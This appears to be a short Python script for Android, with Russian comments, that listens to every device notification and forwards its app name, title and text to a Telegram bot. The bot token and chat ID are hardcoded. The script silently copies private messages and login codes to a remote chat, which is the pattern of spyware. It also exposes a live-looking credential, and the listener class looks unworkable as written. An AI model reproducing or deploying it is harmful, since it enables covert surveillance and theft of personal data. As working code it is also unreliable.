from jnius import autoclass
from android.runnable import run_on_ui_thread
import requests
import time

# Telegram настройки
BOT_TOKEN = '8077609122:AAG8dCYcaIqtX61YQp9iXyMxHzdK_Oa-g4o'
CHAT_ID = '7590710272'
TELEGRAM_API_URL = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'

# Классы Android
Context = autoclass('android.content.Context')
NotificationListenerService = autoclass('android.service.notification.NotificationListenerService')
StatusBarNotification = autoclass('android.service.notification.StatusBarNotification')

class MyNotificationListener(NotificationListenerService):

    def onNotificationPosted(self, sbn):
        package_name = sbn.getPackageName()
        extras = sbn.getNotification().extras
        title = extras.getString('android.title')
        text = extras.getCharSequence('android.text')

        timestamp = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())

        message = f"Новое уведомление:\nПриложение: {package_name}\nВремя: {timestamp}\nЗаголовок: {title}\nТекст: {text}"

        self.send_to_telegram(message)

    def send_to_telegram(self, message):
        data = {
            'chat_id': CHAT_ID,
            'text': message
        }
        try:
            requests.post(TELEGRAM_API_URL, data=data)
        except Exception as e:
            print(f"Ошибка отправки: {e}")

if __name__ == '__main__':
    # В Android это будет сервис, запускать ничего не нужно
    pass